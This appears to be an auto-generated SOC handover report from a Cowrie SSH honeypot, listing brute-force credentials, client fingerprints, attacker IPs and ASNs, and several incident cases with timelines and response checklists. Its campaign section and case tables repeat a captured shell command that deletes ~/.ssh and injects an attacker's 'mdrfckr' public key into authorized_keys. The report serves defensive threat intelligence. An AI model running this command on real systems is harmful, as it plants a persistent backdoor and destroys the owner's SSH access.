# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-26 |
| **Generated At** | 2026-05-26T18:31:05Z |
| **Shift Time** | 18:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **175** |
| Confirmed Threats | **168** |
| False Positives Filtered | **7** (4.0%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **12** |
| High Severity Cases | **78** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **97** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **159** |
| Unique Credential Pairs | **67** |
| Unique Usernames | **30** |
| Unique Passwords | **64** |
| Successful Auth Pairs | **48** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 78 |
| `345gs5662d34` | 39 |
| `ubuntu` | 7 |
| `curl` | 4 |
| `cloud` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 39 |
| `3245gs5662d34` | 39 |
| `fjbdfdjkdsfs541544AA@@` | 8 |
| `fjbdfdjkdsfs541544@@` | 5 |
| `welltech12` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 39 |
| `root` | `3245gs5662d34` | 39 |
| `root` | `fjbdfdjkdsfs541544@@` | 5 |
| `root` | `fjbdfdjkdsfs541544AA@@` | 4 |
| `ubuntu` | `fjbdfdjkdsfs541544AA@@` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root@123` | `110.166.87.119` | 2026-05-26T16:04:04 |
| `root` | `3245gs5662d34` | `110.166.87.119` | 2026-05-26T16:04:22 |
| `root` | `Qaz@12345` | `120.203.25.201` | 2026-05-26T16:08:47 |
| `root` | `3245gs5662d34` | `120.203.25.201` | 2026-05-26T16:08:51 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `35.237.94.18` | 2026-05-26T16:25:14 |
| `root` | `3245gs5662d34` | `35.237.94.18` | 2026-05-26T16:25:20 |
| `root` | `fjbdfdjkdsfs541544@@` | `35.237.94.18` | 2026-05-26T16:25:50 |
| `root` | `zxcvbn` | `35.237.94.18` | 2026-05-26T16:27:03 |
| `root` | `admin@123.com` | `35.237.94.18` | 2026-05-26T16:27:39 |
| `root` | `qwe123@` | `35.237.94.18` | 2026-05-26T16:29:22 |
| `root` | `Fw123456@` | `35.237.94.18` | 2026-05-26T16:32:55 |
| `root` | `Pass@2026` | `35.237.94.18` | 2026-05-26T16:33:28 |
| `root` | `@admin1234` | `35.237.94.18` | 2026-05-26T16:34:00 |
| `root` | `PassW0rd` | `35.237.94.18` | 2026-05-26T16:35:45 |
| `root` | `252525` | `120.1.87.115` | 2026-05-26T16:49:21 |
| `root` | `3245gs5662d34` | `120.1.87.115` | 2026-05-26T16:49:24 |
| `root` | `Test2026!` | `190.81.117.162` | 2026-05-26T16:58:55 |
| `root` | `3245gs5662d34` | `190.81.117.162` | 2026-05-26T16:59:03 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `190.81.117.162` | 2026-05-26T16:59:41 |
| `root` | `fjbdfdjkdsfs541544@@` | `190.81.117.162` | 2026-05-26T17:01:57 |
| `root` | `123456@abc` | `190.81.117.162` | 2026-05-26T17:04:57 |
| `root` | `admin12345` | `40.82.214.8` | 2026-05-26T17:06:40 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-05-26T17:06:49 |
| `root` | `xy@123456` | `40.82.214.8` | 2026-05-26T17:07:52 |
| `root` | `P@ssw0rd1234!` | `40.82.214.8` | 2026-05-26T17:09:04 |
| `root` | `Zxc123123` | `190.81.117.162` | 2026-05-26T17:09:56 |
| `root` | `root_root` | `40.82.214.8` | 2026-05-26T17:10:16 |
| `root` | `Hh123456` | `190.81.117.162` | 2026-05-26T17:10:51 |
| `root` | `rootroot01` | `40.82.214.8` | 2026-05-26T17:11:24 |
| `root` | `Root.123` | `190.81.117.162` | 2026-05-26T17:12:38 |
| `root` | `1234Abcd` | `190.81.117.162` | 2026-05-26T17:17:19 |
| `root` | `!@#QWE123qwe` | `190.81.117.162` | 2026-05-26T17:18:08 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `40.82.214.8` | 2026-05-26T17:18:19 |
| `root` | `fjbdfdjkdsfs541544@@` | `115.190.126.68` | 2026-05-26T17:18:41 |
| `root` | `3245gs5662d34` | `115.190.126.68` | 2026-05-26T17:18:45 |
| `root` | `qwerty-12` | `40.82.214.8` | 2026-05-26T17:19:28 |
| `root` | `fjbdfdjkdsfs541544@@` | `40.82.214.8` | 2026-05-26T17:20:36 |
| `root` | `1qazxsw2#EDCVFR$` | `40.82.214.8` | 2026-05-26T17:25:11 |
| `root` | `!QAZXSW@123` | `40.82.214.8` | 2026-05-26T17:27:26 |
| `root` | `123456.com` | `183.166.94.133` | 2026-05-26T17:28:51 |
| `root` | `3245gs5662d34` | `183.166.94.133` | 2026-05-26T17:28:58 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `183.166.94.133` | 2026-05-26T17:29:32 |
| `root` | `fjbdfdjkdsfs541544@@` | `183.166.94.133` | 2026-05-26T17:30:14 |
| `root` | `p@$$w0rd` | `183.166.94.133` | 2026-05-26T17:33:45 |
| `root` | `debian12` | `112.219.104.42` | 2026-05-26T17:34:03 |
| `root` | `3245gs5662d34` | `112.219.104.42` | 2026-05-26T17:34:07 |
| `root` | `123qweASD` | `183.166.94.133` | 2026-05-26T17:34:26 |
| `root` | `a1s2d3f4` | `183.166.94.133` | 2026-05-26T17:36:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **175** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 162 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 108 | 4 |
| `af8223ac9914...` | libssh-based | 38 | 1 |
| `03a80b21afa8...` | Modern SSH client | 13 | 5 |
| `19532158b559...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 108 | 4 | Mirai/variant |
| `af8223ac9914...` | libssh | 38 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 13 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 39 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `40.82.214.8`, `112.219.104.42`, `120.203.25.201`, `35.237.94.18`, `183.166.94.133`, `115.190.126.68`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **19** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | HIGH |
| `AS9829` | National Internet Backbone | 1 | MEDIUM |
| `AS396982` | Google LLC | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (78)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f3ef2209440e

| Field | Detail |
|---|---|
| **Source IP** | `110.166.87[.]119` |
| **First Seen** | 2026-05-26 16:03 |
| **Last Seen** | 2026-05-26 16:04 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:03:58` | `cowrie.session.connect` |
| `2026-05-26 16:03:58` | `cowrie.client.version` |
| `2026-05-26 16:04:01` | `cowrie.client.kex` |
| `2026-05-26 16:04:04` | `cowrie.login.success` |
| `2026-05-26 16:04:05` | `cowrie.session.params` |
| `2026-05-26 16:04:05` | `cowrie.command.input` |
| `2026-05-26 16:04:05` | `cowrie.command.failed` |
| `2026-05-26 16:04:06` | `cowrie.log.closed` |
| `2026-05-26 16:04:06` | `cowrie.session.params` |
| `2026-05-26 16:04:06` | `cowrie.command.input` |
| `2026-05-26 16:04:14` | `cowrie.session.file_download` |
| `2026-05-26 16:04:14` | `cowrie.log.closed` |
| `2026-05-26 16:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.166.87[.]119` to AbuseIPDB if not already reported
- [ ] Block `110.166.87[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac774cff4a8

| Field | Detail |
|---|---|
| **Source IP** | `110.166.87[.]119` |
| **First Seen** | 2026-05-26 16:04 |
| **Last Seen** | 2026-05-26 16:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:04:20` | `cowrie.session.connect` |
| `2026-05-26 16:04:20` | `cowrie.client.version` |
| `2026-05-26 16:04:20` | `cowrie.client.kex` |
| `2026-05-26 16:04:22` | `cowrie.login.success` |
| `2026-05-26 16:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.166.87[.]119` to AbuseIPDB if not already reported
- [ ] Block `110.166.87[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32c0b1ea053

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-05-26 16:08 |
| **Last Seen** | 2026-05-26 16:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:08:47` | `cowrie.session.connect` |
| `2026-05-26 16:08:47` | `cowrie.client.version` |
| `2026-05-26 16:08:47` | `cowrie.client.kex` |
| `2026-05-26 16:08:47` | `cowrie.login.success` |
| `2026-05-26 16:08:48` | `cowrie.session.params` |
| `2026-05-26 16:08:48` | `cowrie.command.input` |
| `2026-05-26 16:08:48` | `cowrie.command.failed` |
| `2026-05-26 16:08:48` | `cowrie.log.closed` |
| `2026-05-26 16:08:48` | `cowrie.session.params` |
| `2026-05-26 16:08:48` | `cowrie.command.input` |
| `2026-05-26 16:08:48` | `cowrie.session.file_download` |
| `2026-05-26 16:08:48` | `cowrie.log.closed` |
| `2026-05-26 16:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f34befb07e1c

| Field | Detail |
|---|---|
| **Source IP** | `120.203.25[.]201` |
| **First Seen** | 2026-05-26 16:08 |
| **Last Seen** | 2026-05-26 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:08:51` | `cowrie.session.connect` |
| `2026-05-26 16:08:51` | `cowrie.client.version` |
| `2026-05-26 16:08:51` | `cowrie.client.kex` |
| `2026-05-26 16:08:51` | `cowrie.login.success` |
| `2026-05-26 16:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.203.25[.]201` to AbuseIPDB if not already reported
- [ ] Block `120.203.25[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9ef792ebdb

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:25 |
| **Last Seen** | 2026-05-26 16:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:25:13` | `cowrie.session.connect` |
| `2026-05-26 16:25:13` | `cowrie.client.version` |
| `2026-05-26 16:25:13` | `cowrie.client.kex` |
| `2026-05-26 16:25:14` | `cowrie.login.success` |
| `2026-05-26 16:25:14` | `cowrie.session.params` |
| `2026-05-26 16:25:14` | `cowrie.command.input` |
| `2026-05-26 16:25:14` | `cowrie.command.failed` |
| `2026-05-26 16:25:15` | `cowrie.log.closed` |
| `2026-05-26 16:25:15` | `cowrie.session.params` |
| `2026-05-26 16:25:15` | `cowrie.command.input` |
| `2026-05-26 16:25:15` | `cowrie.session.file_download` |
| `2026-05-26 16:25:15` | `cowrie.log.closed` |
| `2026-05-26 16:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e25b1c76e318

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:25 |
| **Last Seen** | 2026-05-26 16:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:25:18` | `cowrie.session.connect` |
| `2026-05-26 16:25:18` | `cowrie.client.version` |
| `2026-05-26 16:25:19` | `cowrie.client.kex` |
| `2026-05-26 16:25:20` | `cowrie.login.success` |
| `2026-05-26 16:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d12ff3d1bad

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:25 |
| **Last Seen** | 2026-05-26 16:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:25:49` | `cowrie.session.connect` |
| `2026-05-26 16:25:49` | `cowrie.client.version` |
| `2026-05-26 16:25:49` | `cowrie.client.kex` |
| `2026-05-26 16:25:50` | `cowrie.login.success` |
| `2026-05-26 16:25:51` | `cowrie.session.params` |
| `2026-05-26 16:25:51` | `cowrie.command.input` |
| `2026-05-26 16:25:51` | `cowrie.command.failed` |
| `2026-05-26 16:25:51` | `cowrie.log.closed` |
| `2026-05-26 16:25:51` | `cowrie.session.params` |
| `2026-05-26 16:25:51` | `cowrie.command.input` |
| `2026-05-26 16:25:52` | `cowrie.session.file_download` |
| `2026-05-26 16:25:52` | `cowrie.log.closed` |
| `2026-05-26 16:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e820bb0beb0

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:25 |
| **Last Seen** | 2026-05-26 16:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:25:55` | `cowrie.session.connect` |
| `2026-05-26 16:25:55` | `cowrie.client.version` |
| `2026-05-26 16:25:55` | `cowrie.client.kex` |
| `2026-05-26 16:25:56` | `cowrie.login.success` |
| `2026-05-26 16:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa0fa9d6005

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:27 |
| **Last Seen** | 2026-05-26 16:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:27:02` | `cowrie.session.connect` |
| `2026-05-26 16:27:02` | `cowrie.client.version` |
| `2026-05-26 16:27:02` | `cowrie.client.kex` |
| `2026-05-26 16:27:03` | `cowrie.login.success` |
| `2026-05-26 16:27:04` | `cowrie.session.params` |
| `2026-05-26 16:27:04` | `cowrie.command.input` |
| `2026-05-26 16:27:04` | `cowrie.command.failed` |
| `2026-05-26 16:27:04` | `cowrie.log.closed` |
| `2026-05-26 16:27:04` | `cowrie.session.params` |
| `2026-05-26 16:27:04` | `cowrie.command.input` |
| `2026-05-26 16:27:05` | `cowrie.session.file_download` |
| `2026-05-26 16:27:05` | `cowrie.log.closed` |
| `2026-05-26 16:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d737a887cc64

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:27 |
| **Last Seen** | 2026-05-26 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:27:08` | `cowrie.session.connect` |
| `2026-05-26 16:27:08` | `cowrie.client.version` |
| `2026-05-26 16:27:08` | `cowrie.client.kex` |
| `2026-05-26 16:27:09` | `cowrie.login.success` |
| `2026-05-26 16:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0edab5be1b

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-05-26 16:27 |
| **Last Seen** | 2026-05-26 16:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 16:27:38` | `cowrie.session.connect` |
| `2026-05-26 16:27:38` | `cowrie.client.version` |
| `2026-05-26 16:27:38` | `cowrie.client.kex` |
| `2026-05-26 16:27:39` | `cowrie.login.success` |
| `2026-05-26 16:27:40` | `cowrie.session.params` |
| `2026-05-26 16:27:40` | `cowrie.command.input` |
| `2026-05-26 16:27:40` | `cowrie.command.failed` |
| `2026-05-26 16:27:40` | `cowrie.log.closed` |
| `2026-05-26 16:27:40` | `cowrie.session.params` |
| `2026-05-26 16:27:40` | `cowrie.command.input` |
| `2026-05-26 16:27:41` | `cowrie.session.file_download` |
| `2026-05-26 16:27:41` | `cowrie.log.closed` |
| `2026-05-26 16:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

